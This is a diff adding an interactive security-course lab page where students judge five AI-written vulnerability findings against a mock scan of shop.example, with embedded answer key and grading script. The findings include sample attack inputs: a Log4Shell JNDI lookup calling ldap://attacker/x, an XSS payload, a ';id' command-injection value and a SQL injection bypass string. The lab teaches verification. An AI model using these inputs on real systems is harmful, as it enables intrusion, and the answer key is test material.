@@ -1,0 +1,382 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>AI Triage Check — Verifying AI Findings &amp; Reproduction Steps</title>
+<style>
+  :root{
+    --bg:#0a0e14; --bg2:#0f1620; --panel:#111a26; --panel2:#0c141d; --inset:#0f1823;
+    --ink:#c9d4e0; --muted:#6b7a8d; --line:#1e2b3a; --line2:#27384b;
+    --red:#ff3b47; --red-d:#b4232c; --cyan:#35d0d8; --amber:#ffb13b;
+    --green:#38d39f; --violet:#9b8cff;
+    --codebg:#06090e; --cta:#35d0d8;
+    --mono:'SFMono-Regular',ui-monospace,'Cascadia Code','Consolas',monospace;
+    --sans:'Inter',system-ui,-apple-system,'Segoe UI',sans-serif;
+  }
+  :root[data-theme="light"]{
+    --bg:#eceff4; --bg2:#eef1f6; --panel:#ffffff; --panel2:#eef2f7; --inset:#f6f8fb;
+    --ink:#1b2430; --muted:#5b6675; --line:#e2e7ef; --line2:#d3dae3;
+    --cyan:#0b8f97; --amber:#b4770a; --green:#15935f; --red:#d0314a; --violet:#6b4ef0;
+    --codebg:#eef2f7;
+  }
+  *{box-sizing:border-box}
+  html,body{height:100%}
+  body{margin:0;background:var(--bg);color:var(--ink);font-family:var(--sans);font-size:17px;line-height:1.5;-webkit-font-smoothing:antialiased}
+  button{font-family:inherit}
+
+  header{display:flex;align-items:center;gap:13px;padding:11px 18px;background:linear-gradient(180deg,var(--bg2),var(--bg));border-bottom:1px solid var(--line);position:sticky;top:0;z-index:30}
+  .logo{width:30px;height:30px;border-radius:7px;flex:none;background:conic-gradient(from 210deg,var(--cyan),var(--violet),var(--amber),var(--cyan));position:relative}
+  .logo::after{content:"";position:absolute;inset:5px;border-radius:4px;background:var(--bg)}
+  .logo::before{content:"\2713";position:absolute;inset:0;display:grid;place-items:center;font-size:15.5px;z-index:2}
+  header h1{font-size:17.5px;margin:0;font-weight:650}
+  header .sub{font-size:13px;color:var(--muted);font-family:var(--mono)}
+  .top-right{margin-left:auto;display:flex;align-items:center;gap:10px}
+  .score-pill{font-family:var(--mono);font-size:14.5px;background:var(--panel);border:1px solid var(--line);padding:5px 11px;border-radius:999px}
+  .score-pill b{color:var(--amber)}
+  .btn{background:var(--panel);color:var(--ink);border:1px solid var(--line);padding:6px 12px;border-radius:6px;cursor:pointer;font-size:14.5px;transition:.15s}
+  .btn:hover{border-color:var(--cyan);color:#fff}.btn:disabled{opacity:.5;cursor:default}
+  .btn.fin{border-color:var(--red-d)}.btn.fin:hover{border-color:var(--red);background:rgba(255,59,71,.08)}
+
+  .steps{margin:16px 18px 0;background:var(--panel);border:1px solid var(--line);border-radius:11px;padding:14px 16px}
+  .steps h3{margin:0 0 4px;font-size:15.5px;font-family:var(--mono);color:var(--amber)}
+  .steps .intro{font-size:15px;color:var(--muted);line-height:1.65;margin-bottom:11px}
+  .steps .intro b{color:var(--cyan)}
+  .steprow{display:flex;gap:7px;flex-wrap:wrap}
+  .step-btn{font-size:14.5px;padding:5px 12px;background:var(--panel2);border:1px solid var(--line);border-radius:6px;cursor:pointer;color:var(--cyan);font-family:var(--mono)}
+  .step-btn:hover{border-color:var(--cyan)}.step-btn.used{color:var(--muted);border-style:dashed;cursor:default}
+  .step-text{font-size:15.5px;color:var(--ink);line-height:1.65;margin-top:8px;background:var(--inset);border-left:2px solid var(--cyan);padding:9px 11px;border-radius:0 6px 6px 0}
+  .step-text b{color:var(--amber)}.step-text code{font-family:var(--mono);font-size:14.5px;background:var(--panel2);color:var(--cyan);padding:1px 5px;border-radius:4px}
+  .progress{font-family:var(--mono);font-size:14px;color:var(--muted);margin-top:11px;padding-top:10px;border-top:1px solid var(--line)}
+
+  .wrap{display:grid;grid-template-columns:480px 1fr;gap:16px;padding:16px 18px;align-items:start}
+  .col h2{font-size:15.5px;font-family:var(--mono);color:var(--muted);margin:0 0 10px;letter-spacing:.3px}
+
+  .card{background:var(--panel);border:1px solid var(--line);border-radius:11px;overflow:hidden;margin-bottom:14px}
+  .yaml{background:var(--codebg);padding:12px 14px;font-family:var(--mono);font-size:14px;line-height:1.6;white-space:pre;overflow-x:auto;color:var(--ink)}
+  .yaml .yc{color:var(--muted)} .yaml .yk{color:var(--cyan)} .yaml .yv{color:var(--ink)}
+  .yaml .y-ALLOW{color:var(--green);font-weight:700}
+  .yaml .y-REQUIRE_APPROVAL{color:var(--amber);font-weight:700}
+  .yaml .y-DENY{color:var(--red);font-weight:700}
+  .yamlnote{font-size:14px;color:var(--muted);line-height:1.55;padding:10px 14px;border-top:1px solid var(--line)}
+  .yamlnote b{color:var(--cyan)}
+  .cardhead{padding:10px 14px;border-bottom:1px solid var(--line);background:var(--bg2);font-family:var(--mono);font-size:14.5px;color:var(--violet)}
+  .facts{padding:10px 14px;font-size:15px;line-height:1.7}
+  .facts .row{display:flex;gap:8px;padding:3px 0}
+  .facts .k{font-family:var(--mono);font-size:12.5px;color:var(--muted);min-width:94px;flex:none;padding-top:2px}
+  .facts code{font-family:var(--mono);background:var(--panel2);padding:1px 5px;border-radius:4px;color:var(--cyan);font-size:14px}
+  .facts .open{color:var(--green)} .facts .closed{color:var(--red)}
+
+  .finding{background:var(--panel);border:1px solid var(--line);border-radius:11px;padding:14px;margin-bottom:13px}
+  .finding.solved{border-color:var(--green)}
+  .finding .ftitle{font-size:17px;font-weight:650;margin-bottom:2px}
+  .finding .floc{font-family:var(--mono);font-size:14px;color:var(--cyan);margin-bottom:9px}
+  .finding .claim{font-size:15px;margin-bottom:7px}
+  .finding .claim .ck{font-family:var(--mono);font-size:13px;color:var(--muted)}
+  .finding .claim code{font-family:var(--mono);background:var(--panel2);padding:1px 5px;border-radius:4px;color:var(--amber);font-size:14px}
+  .vsteps{margin:4px 0 8px;padding-left:0;list-style:none;counter-reset:vs}
+  .vsteps li{position:relative;padding:3px 0 3px 26px;font-size:15px;color:var(--ink)}
+  .vsteps li::before{counter-increment:vs;content:counter(vs);position:absolute;left:0;top:3px;width:17px;height:17px;border-radius:50%;background:var(--panel2);border:1px solid var(--line2);color:var(--muted);font-family:var(--mono);font-size:12px;display:grid;place-items:center}
+  .vsteps code{font-family:var(--mono);background:var(--panel2);padding:1px 5px;border-radius:4px;color:var(--amber);font-size:14px}
+  .airesult{font-size:14.5px;color:var(--muted);font-style:italic;margin-bottom:10px;border-left:2px solid var(--line2);padding-left:9px}
+
+  .helprow{display:flex;gap:6px;flex-wrap:wrap;margin-bottom:9px}
+  .hb{font-size:13px;padding:4px 10px;background:var(--panel2);border:1px solid var(--line);border-radius:6px;cursor:pointer;font-family:var(--mono)}
+  .hb[data-k="bg"]{color:var(--violet)}.hb[data-k="hint"]{color:var(--amber)}
+  .hb:hover{border-color:var(--cyan)}.hb.used{opacity:.7;border-style:dashed}
+  .helpbox{font-size:14.5px;line-height:1.6;margin-bottom:9px;padding:9px 11px;border-radius:0 7px 7px 0;display:none}
+  .helpbox.bg{background:var(--inset);border-left:2px solid var(--violet)}
+  .helpbox.hint{background:rgba(255,177,59,.06);border-left:2px solid var(--amber)}
+  .helpbox b{color:var(--amber)}.helpbox.bg b{color:var(--violet)}
+  .frow{display:flex;flex-direction:column;gap:4px;margin-bottom:9px}
+  .frow label{font-size:13px;color:var(--muted)}
+  select{background:var(--panel2);border:1px solid var(--line);color:var(--ink);border-radius:7px;padding:8px 10px;font-size:15px;font-family:var(--sans);width:100%}
+  select:focus{outline:none;border-color:var(--cyan)}
+  .fresult{font-size:14.5px;margin-top:4px;font-family:var(--mono)}
+  .fresult.ok{color:var(--green)}.fresult.no{color:var(--amber)}
+  .why{font-size:14.5px;color:var(--green);background:rgba(56,211,159,.07);border-left:2px solid var(--green);padding:9px 11px;border-radius:0 7px 7px 0;margin-top:9px;display:none;line-height:1.6}
+  .why.show{display:block}.why b{color:var(--green)}
+
+  .gate{position:fixed;inset:0;z-index:100;display:grid;place-items:center;background:var(--bg);padding:20px}
+  .gate-card{max-width:600px;width:100%;background:var(--panel);border:1px solid var(--line);border-radius:14px;padding:28px}
+  .gate-card h2{margin:12px 0 2px;font-size:26.5px}
+  .proto{display:inline-block;font-family:var(--mono);font-size:12px;letter-spacing:.5px;color:var(--amber);background:rgba(255,177,59,.12);border:1px solid rgba(255,177,59,.3);padding:2px 8px;border-radius:5px;margin-left:8px;vertical-align:middle}
+  .scenario{color:var(--muted);font-size:15.5px;margin:14px 0 18px;border-left:2px solid var(--cyan);padding-left:13px;line-height:1.6}
+  .scenario b{color:var(--cyan)}
+  .gate-card label{display:block;font-size:14.5px;color:var(--muted);margin-bottom:6px;font-family:var(--mono)}
+  .gate-card input{width:100%;background:var(--panel2);border:1px solid var(--line);color:var(--ink);padding:11px 12px;border-radius:8px;font-size:18px;font-family:var(--mono)}
+  .gate-card input:focus{outline:none;border-color:var(--cyan)}
+  .gate-start{margin-top:16px;width:100%;background:var(--cta);color:#06222a;border:none;border-radius:9px;font-size:17px;padding:12px;font-weight:700;cursor:pointer}
+  .roe{font-size:14px;color:var(--muted);margin-top:15px;line-height:1.6;background:var(--inset);border-radius:9px;padding:11px 13px}
+  .roe b{color:var(--ink)}
+  .modal{position:fixed;inset:0;z-index:120;background:rgba(5,8,12,.82);display:none;place-items:center;padding:20px;overflow-y:auto}
+  .modal.open{display:grid}
+  .modal-card{max-width:540px;width:100%;background:var(--panel);border:1px solid var(--line);border-radius:14px;padding:26px;margin:auto}
+  .modal-card h2{margin:0 0 6px;font-size:24px}
+  .close-x{float:right;cursor:pointer;color:var(--muted);font-size:26.5px;line-height:1}
+  .big-score{font-family:var(--mono);font-size:48px;color:var(--amber);text-align:center;margin:10px 0}
+  .cstat{display:flex;justify-content:space-between;padding:9px 0;border-bottom:1px solid var(--line);font-size:15.5px}
+  .cstat b{font-family:var(--mono)}
+
+  @media(max-width:860px){.wrap{grid-template-columns:1fr}.card{position:static}}
+</style>
+</head>
+<body>
+
+<div class="gate" id="gate">
+  <div class="gate-card">
+    <div style="display:flex;align-items:center;gap:11px"><div class="logo"></div><div><h1 style="margin:0;font-size:18px">CIT-2650 / CIT-2642</h1><div class="sub">Module 5 · Vulnerability Scanning</div></div></div>
+    <h2>AI Triage Check</h2>
+    <div class="scenario">
+      You ran a vulnerability scan against <b>shop.example</b> and asked an AI to write up each finding with a CVE and
+      <b>steps to recreate</b> it. The write-ups read as confident and complete — but a finding is only real if you can
+      reproduce it, and AI recreation steps are often wrong: a famous CVE pinned to the wrong software, steps that never
+      actually trigger the bug, or a finding on a service that isn't even running. <b>Verify each finding against the raw
+      scan and its recreation steps</b> before it goes in your report.
+    </div>
+    <label for="student">Enter your name to begin</label>
+    <input id="student" placeholder="e.g. jsmith" autocomplete="off" spellcheck="false">
+    <button class="gate-start" id="startBtn">Start the review →</button>
+    <div class="roe"><b>How this works:</b> The scan results are on the left (your ground truth). Each AI finding on the right lists a CVE claim and numbered steps to recreate the vulnerability. For each, decide whether to confirm it or reject it — and why. Five findings; some are hallucinations. Every card has free <b>Background</b> and <b>Hint</b> help. Worth 10 points (2 per finding); auto-graded — screenshot the Finish &amp; Grade summary.</div>
+  </div>
+</div>
+
+<header>
+  <div class="logo"></div>
+  <div><h1>AI Triage Check</h1><div class="sub" id="whoami">—</div></div>
+  <div class="top-right">
+    <button class="btn" id="themeBtn">☀ Light</button>
+    <div class="score-pill">Verified <b id="verifiedNow">0</b>/5 · Score <b id="scoreNow">0</b>/10</div>
+    <button class="btn fin" id="finishBtn">Finish &amp; grade</button>
+  </div>
+</header>
+
+<div class="steps">
+  <h3>LAB STEPS</h3>
+  <div class="intro" id="railIntro"></div>
+  <div class="steprow" id="railSteps"></div>
+  <div id="railReveal"></div>
+  <div class="progress" id="railProgress"></div>
+</div>
+
+<div class="wrap">
+  <div class="col">
+    <h2>// VULNERABILITY SCAN (ground truth)</h2>
+    <div class="card">
+      <div class="cardhead">scan_results · shop.example (10.10.10.20)</div>
+      <div class="facts" id="facts"></div>
+    </div>
+    <div class="card">
+      <div class="cardhead">harness.yaml · governs this engagement</div>
+      <div class="yaml" id="harnessYaml"></div>
+      <div class="yamlnote">The harness built in the <b>Module 3</b> lab authorized this scan and requires human validation of every finding — <b>this lab is that step.</b></div>
+    </div>
+  </div>
+  <div class="col">
+    <h2>// AI FINDINGS — verify the CVE &amp; recreation steps</h2>
+    <div id="findingList"></div>
+  </div>
+</div>
+
+<div class="modal" id="doneModal">
+  <div class="modal-card">
+    <span class="close-x" data-close="doneModal">×</span>
+    <h2>Review complete</h2>
+    <div class="big-score" id="doneScore">0 / 10</div>
+    <div class="cstat"><span>Tester</span><b id="doneName">—</b></div>
+    <div class="cstat"><span>Date / time</span><b id="doneDate">—</b></div>
+    <div class="cstat"><span>Findings verified</span><b id="doneV">0 / 5</b></div>
+    <div class="cstat"><span>Completion code</span><b id="doneCode">—</b></div>
+    <p style="font-size:14.5px;color:var(--muted);margin-top:16px">Screenshot this screen for your submission. Your completion code is tied to your name.</p>
+  </div>
+</div>
+
+<script>
+const S={name:"",score:0,solved:{},stepsSeen:{}};
+function hash(str){let h=2166136261;for(let i=0;i<str.length;i++){h^=str.charCodeAt(i);h=Math.imul(h,16777619);}return (h>>>0).toString(16).padStart(8,'0');}
+
+/* ---------- scan results (ground truth) ---------- */
+const FACTS=[
+ ["target","shop.example &middot; host <code>10.10.10.20</code>"],
+ ["stack","Apache Tomcat 9.0 (Java) &middot; <code>Apache Struts 2.5.10</code> &middot; nginx 1.24 reverse proxy"],
+ ["open ports",'<span class="open">80/tcp → 443</span> &middot; <span class="open">443/tcp</span> &middot; <span class="open">8080/tcp Tomcat</span>'],
+ ["closed ports",'<span class="closed">21/tcp — no FTP service</span>'],
+ ["/search","reflects the <code>q</code> parameter back into the page (text/html)"],
+ ["/login","username + password form (POST)"],
+ ["/tools/ping","runs the system <code>ping</code> command on a host field (POST)"],
+ ["/products","product listing backed by a SQL query"],
+ ["notes","Struts' known RCE is <code>CVE-2017-5638</code> (Jakarta Multipart). No Apache Log4j component detected."]
+];
+
+/* ---------- verdicts ---------- */
+const VERDICTS=["— choose your verdict —",
+ "Confirmed — real finding; the CVE (or no-CVE) is right and the steps reproduce it",
+ "Reject — the cited CVE is wrong or doesn't apply to this software",
+ "Reject — the recreation steps don't actually reproduce the vulnerability",
+ "Reject — false positive; the vulnerability isn't present here"];
+/* correct index: 1 confirmed · 2 reject-CVE · 3 reject-steps · 4 reject-FP */
+
+const FINDINGS=[
+ {title:"Apache Struts remote code execution",loc:"shop.example — Apache Struts 2.5.10",
+  cve:"CVE-2021-44228 (Log4Shell)",
+  steps:["Send a request header containing a JNDI lookup: <code>${jndi:ldap://attacker/x}</code>","Watch for an outbound LDAP connection from the server","Conclude remote code execution via Log4Shell"],
+  result:"AI reports the server is vulnerable to Log4Shell RCE.",
+  verdict:2,
+  bg:"A CVE names a vulnerability in a specific product. CVE-2021-44228 — \u201cLog4Shell\u201d — is a flaw in Apache Log4j, a Java logging library, not in Apache Struts. Models often staple a famous CVE onto any Java app without checking the product it belongs to.",
+  hint:"What product does CVE-2021-44228 belong to — is it the same product as the finding's title? What is Struts' actual known RCE CVE (check the scan notes)?",
+  why:"CVE-2021-44228 is the Log4j Log4Shell flaw, not a Struts bug — the scan found no Log4j, and Struts' real RCE is CVE-2017-5638. The AI pinned a famous CVE to the wrong product, and the JNDI steps are the Log4Shell method, which doesn't apply here. Reject: wrong CVE."},
+
+ {title:"Reflected XSS in /search",loc:"shop.example /search?q=",
+  cve:"No CVE (application-specific)",
+  steps:["Request <code>/search?q=&lt;script&gt;alert(document.domain)&lt;/script&gt;</code>","Inspect the HTML response for the q value","Confirm the payload is reflected unescaped and executes in the page"],
+  result:"Payload reflected unescaped; the alert fires.",
+  verdict:1,
+  bg:"Reflected XSS happens when user input is echoed into the page without encoding. To reproduce it you inject a script payload through the reflected parameter and confirm it renders unescaped and runs. App-specific bugs like this often have no CVE.",
+  hint:"The scan says /search reflects the q parameter into the page. Do the steps inject a payload and check for unescaped reflection? Should a custom-app XSS have a CVE?",
+  why:"The scan confirms /search reflects the q parameter, the steps inject a script payload and verify it renders unescaped and executes, and reporting \u201cno CVE\u201d is correct for an app-specific bug. These steps really would reproduce the vulnerability — confirm it."},
+
+ {title:"OS command injection in /tools/ping",loc:"shop.example /tools/ping (host field)",
+  cve:"No CVE (application-specific)",
+  steps:["Submit the form with host = <code>10.10.10.1; id</code>","Observe the ping output followed by the output of the injected <code>id</code> command","Confirm arbitrary commands run in the server's shell"],
+  result:"Response shows ping output plus <code>uid=33(www-data) gid=33(www-data)</code>.",
+  verdict:1,
+  bg:"Command injection happens when user input is passed into a system shell. To reproduce it you append a shell metacharacter and a second command, then confirm the extra command's output appears alongside the normal output.",
+  hint:"The scan says /tools/ping runs the system ping on the host field. Do the steps append an injected command (a ; or &&) and observe its output — not just a normal ping?",
+  why:"The steps inject a second command with \u201c;\u201d and confirm its output (<code>id</code> → uid=www-data) appears alongside the ping. That genuinely reproduces command injection on the /tools/ping host field — confirm it."},
+
+ {title:"SQL injection in /login",loc:"shop.example /login (username field)",
+  cve:"No CVE (application-specific)",
+  steps:["Enter a valid username and password","Confirm the login succeeds","Conclude the username field is injectable"],
+  result:"AI reports a successful login proves SQL injection.",
+  verdict:3,
+  bg:"A recreation step has to exercise the actual weakness. For SQL injection that means an injection payload and an observable injection effect — an authentication bypass, a database error, or a boolean/time difference — not a normal successful login.",
+  hint:"Do the steps inject anything, or just log in normally? Does a successful login with valid credentials prove the field is injectable?",
+  why:"Logging in with valid credentials only shows the login works; it never injects a payload or observes an injection effect, so it proves nothing about SQLi. Reproducing it would need something like <code>' OR '1'='1' -- </code> in the username and an observed auth bypass. The steps as written don't reproduce the finding — reject: the steps don't reproduce it."},
+
+ {title:"Anonymous FTP access enabled",loc:"10.10.10.20:21",
+  cve:"Weak configuration (anonymous FTP)",
+  steps:["Connect to 10.10.10.20 on port 21","Log in as the <code>anonymous</code> user","List the served directory"],
+  result:"AI reports the anonymous FTP login succeeded and files were listed.",
+  verdict:4,
+  bg:"A finding is only real if the service exists. Scanners and models sometimes report results for ports that aren't open, producing a confident finding — and plausible-looking steps — for a service that isn't there.",
+  hint:"Check the scan's port list. Is 21/tcp open or closed on this host? Can an anonymous FTP login succeed on a closed port?",
+  why:"The scan shows 21/tcp closed — there is no FTP service on the host, so the recreation steps fail at step 1 and the anonymous login could not have succeeded. This is a false positive; reject it."}
+];
+
+const STEPS={
+ intro:"A vulnerability scan — or an AI reading its output — hands you findings that look authoritative. But a finding is only real if you can reproduce it, and the AI's steps to recreate it are often wrong: a <b>CVE pinned to the wrong software</b>, <b>steps that never actually trigger the bug</b>, or a finding on a <b>service that isn't running</b>. You verify each finding against the raw scan and the recreation steps before it reaches a report — you own every finding you confirm.",
+ steps:[
+  "Read the vulnerability scan on the left: the stack and framework versions, which ports are open or closed, and what each endpoint does. Every verdict is checked against these facts.",
+  "For each AI finding, read its <b>CVE claim</b> and its <b>steps to recreate</b>, and ask three things: does the CVE actually belong to this software, would the steps really reproduce the bug, and does the affected service even exist? Set your verdict and Check it. <b>Background</b> and <b>Hint</b> are free.",
+  "Five findings, and some are hallucinations. Watch for a famous CVE attached to the wrong product, recreation steps that only show the feature working (never injecting anything), and a finding on a port the scan shows closed."
+ ]
+};
+
+const $=id=>document.getElementById(id);
+function esc(t){return t.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
+function wireHelp(card,bg,hint){
+  card.querySelectorAll('.hb').forEach(b=>b.onclick=()=>{
+    const k=b.dataset.k,div=card.querySelector(k==='bg'?'.helpbox.bg':'.helpbox.hint');
+    if(!div.dataset.f){div.innerHTML='<b>'+(k==='bg'?'Background':'Hint')+'.</b> '+(k==='bg'?bg:hint);div.dataset.f='1';}
+    const sh=div.style.display!=='block';div.style.display=sh?'block':'none';b.classList.toggle('used',sh);
+  });
+}
+
+function renderFacts(){$('facts').innerHTML=FACTS.map(f=>`<div class="row"><span class="k">${f[0]}</span><span>${f[1]}</span></div>`).join('');}
+function renderHarnessYaml(){
+  const L=[
+   `<span class="yc"># harness.yaml \u2014 governs this engagement</span>`,
+   `<span class="yc"># The AI proposes \u00b7 the harness governs \u00b7 the human validates</span>`,
+   ``,
+   `<span class="yk">engagement</span>:`,
+   `  <span class="yk">client</span>: <span class="yv">shop.example</span>`,
+   `  <span class="yk">name</span>: <span class="yv">vulnerability assessment</span>`,
+   ``,
+   `<span class="yk">authorization</span>:`,
+   `  <span class="yk">state</span>: <span class="yv">passive_nondestructive</span>`,
+   `  <span class="yk">scope</span>:`,
+   `    <span class="yk">in</span>:`,
+   `      - <span class="yv">shop.example</span>`,
+   `      - <span class="yv">10.10.10.20</span>`,
+   `    <span class="yk">unlisted_target</span>: <span class="yv">deny</span>   <span class="yc"># default-deny</span>`,
+   ``,
+   `<span class="yk">policy</span>:`,
+   `  <span class="yk">passive_recon</span>:             <span class="y-ALLOW">ALLOW</span>`,
+   `  <span class="yk">nondestructive_scan</span>:       <span class="y-ALLOW">ALLOW</span>`,
+   `  <span class="yk">intrusive_scan</span>:            <span class="y-REQUIRE_APPROVAL">REQUIRE_APPROVAL</span>`,
+   `  <span class="yk">destructive_or_prohibited</span>: <span class="y-DENY">DENY</span>`,
+   `  <span class="yk">out_of_scope_target</span>:       <span class="y-DENY">DENY</span>`,
+   ``,
+   `<span class="yk">findings</span>:`,
+   `  <span class="yk">require_human_validation</span>: <span class="yv">true</span>   <span class="yc"># \u2190 this lab</span>`,
+  ];
+  $('harnessYaml').innerHTML=L.join('\n');
+}
+
+function renderFindings(){
+  const list=$('findingList');list.innerHTML='';
+  FINDINGS.forEach((f,i)=>{
+    const card=document.createElement('div');card.className='finding';card.id='find-'+i;
+    const vOpts=VERDICTS.map((v,j)=>`<option value="${j}">${esc(v)}</option>`).join('');
+    const stepsHtml=f.steps.map(s=>`<li>${s}</li>`).join('');
+    card.innerHTML=`<div class="ftitle">${i+1}. ${esc(f.title)}</div>
+      <div class="floc">${esc(f.loc)}</div>
+      <div class="claim"><span class="ck">CVE claim:</span> ${f.cve.indexOf('(')>=0||f.cve.indexOf('CVE')>=0?esc(f.cve):esc(f.cve)}</div>
+      <div class="claim"><span class="ck">AI steps to recreate:</span></div>
+      <ol class="vsteps">${stepsHtml}</ol>
+      <div class="airesult">AI result: ${f.result}</div>
+      <div class="helprow"><span class="hb" data-k="bg">Background</span><span class="hb" data-k="hint">Hint</span></div>
+      <div class="helpbox bg"></div><div class="helpbox hint"></div>
+      <div class="frow"><label>Your verdict</label><select class="selV">${vOpts}</select></div>
+      <button class="btn checkF">Check finding</button>
+      <div class="fresult"></div><div class="why"></div>`;
+    list.appendChild(card);
+    wireHelp(card,f.bg,f.hint);
+    card.querySelector('.checkF').onclick=()=>{
+      const v=+card.querySelector('.selV').value;const res=card.querySelector('.fresult');
+      if(v===0){res.className='fresult no';res.textContent='Choose a verdict first.';return;}
+      if(v===f.verdict){
+        if(!S.solved[i]){S.solved[i]=true;S.score+=2;updateScore();}
+        card.classList.add('solved');res.className='fresult ok';res.textContent='✓ Correct verdict. (+2)';
+        const w=card.querySelector('.why');w.innerHTML='<b>Why.</b> '+f.why;w.classList.add('show');
+        card.querySelector('.checkF').disabled=true;card.querySelector('.selV').disabled=true;
+        renderRail();
+      } else {
+        res.className='fresult no';res.textContent='Not quite — re-check the CVE, the recreation steps, and whether the service exists. Try the Hint, then try again.';
+      }
+    };
+  });
+}
+
+function renderRail(){
+  $('railIntro').innerHTML=STEPS.intro;
+  const sr=$('railSteps');sr.innerHTML='';
+  STEPS.steps.forEach((s,i)=>{const u=S.stepsSeen[i];sr.insertAdjacentHTML('beforeend',`<span class="step-btn${u?' used':''}" data-i="${i}">${u?'Step '+(i+1)+' ✓':'Show Step '+(i+1)}</span>`);});
+  let rev='';STEPS.steps.forEach((s,i)=>{if(S.stepsSeen[i])rev+=`<div class="step-text"><b>Step ${i+1}.</b> ${s}</div>`;});
+  $('railReveal').innerHTML=rev;
+  sr.querySelectorAll('.step-btn').forEach(b=>b.onclick=()=>{const k=b.dataset.i;if(S.stepsSeen[k])return;S.stepsSeen[k]=true;renderRail();});
+  $('railProgress').textContent='Findings verified: '+Object.keys(S.solved).length+'/5';
+}
+function updateScore(){$('scoreNow').textContent=S.score;$('verifiedNow').textContent=Object.keys(S.solved).length;}
+
+document.querySelectorAll('[data-close]').forEach(x=>x.onclick=()=>$(x.dataset.close).classList.remove('open'));
+$('themeBtn').onclick=()=>{const l=document.documentElement.getAttribute('data-theme')!=='light';document.documentElement.setAttribute('data-theme',l?'light':'dark');$('themeBtn').textContent=l?'☾ Dark':'☀ Light';};
+$('finishBtn').onclick=()=>{
+  $('doneScore').textContent=S.score+' / 10';
+  $('doneName').textContent=S.name;
+  $('doneDate').textContent=new Date().toLocaleString();
+  $('doneV').textContent=Object.keys(S.solved).length+' / 5';
+  $('doneCode').textContent='ATC{'+hash(S.name.toLowerCase().trim()+'::m5atc')+'}';
+  $('doneModal').classList.add('open');
+};
+$('startBtn').onclick=()=>{
+  const n=$('student').value.trim();
+  if(!n){$('student').focus();$('student').style.borderColor='var(--red)';return;}
+  S.name=n;$('whoami').textContent='tester: '+n;
+  $('gate').style.display='none';
+  renderFacts();renderHarnessYaml();renderFindings();renderRail();updateScore();
+};
+$('student').addEventListener('keydown',e=>{if(e.key==='Enter')$('startBtn').click();});
+</script>
+</body>
+</html>
